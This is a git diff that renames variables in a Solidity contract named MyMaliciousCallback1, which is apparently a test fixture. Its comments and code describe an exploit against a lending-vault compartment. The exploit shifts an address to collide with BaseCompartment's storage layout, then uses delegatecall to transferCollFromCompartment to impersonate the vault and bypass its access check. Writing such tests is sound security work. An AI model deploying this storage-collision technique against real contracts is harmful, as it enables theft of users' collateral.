@@ -3,22 +3,22 @@
 pragma solidity 0.8.19;
 
 contract MyMaliciousCallback1 {
-    uint256 internal vaultVictim;
-    address internal collToken;
-    address internal compartmentVictim;
+    uint256 internal _vaultVictim;
+    address internal _collToken;
+    address internal _compartmentVictim;
 
     constructor(
-        address _vaultVictim,
-        address _collToken,
-        address _compartmentVictim
+        address vaultVictim,
+        address collToken,
+        address compartmentVictim
     ) {
         /* need to shift _vaultVictim by 4x hex to match storage layout f BaseCompartment such that
-         * retrieving vaultAddr in BaseCompartment maps to vaultVictim in this contract and access
+         * retrieving vaultAddr in BaseCompartment maps to _vaultVictim in this contract and access
          * control check in BaseCompartment (i.e., msg.sender != vaultAddr) could be bypassed
          */
-        vaultVictim = uint256(uint160(_vaultVictim)) * 16 * 16 * 16 * 16;
-        collToken = _collToken;
-        compartmentVictim = _compartmentVictim;
+        _vaultVictim = uint256(uint160(vaultVictim)) * 16 * 16 * 16 * 16;
+        _collToken = collToken;
+        _compartmentVictim = compartmentVictim;
     }
 
     function balanceOf(address) external returns (uint256) {
@@ -26,13 +26,13 @@ contract MyMaliciousCallback1 {
          * token contract and then use delegate call transferCollFromCompartment(...) and pretend msg.sender to
          * be the vault.
          */
-        (bool success, bytes memory result) = compartmentVictim.delegatecall(
+        (bool success, bytes memory result) = _compartmentVictim.delegatecall(
             abi.encodeWithSignature(
                 "transferCollFromCompartment(uint256,uint256,address,address,address)",
                 1,
                 1,
                 address(this),
-                collToken,
+                _collToken,
                 address(0)
             )
         );
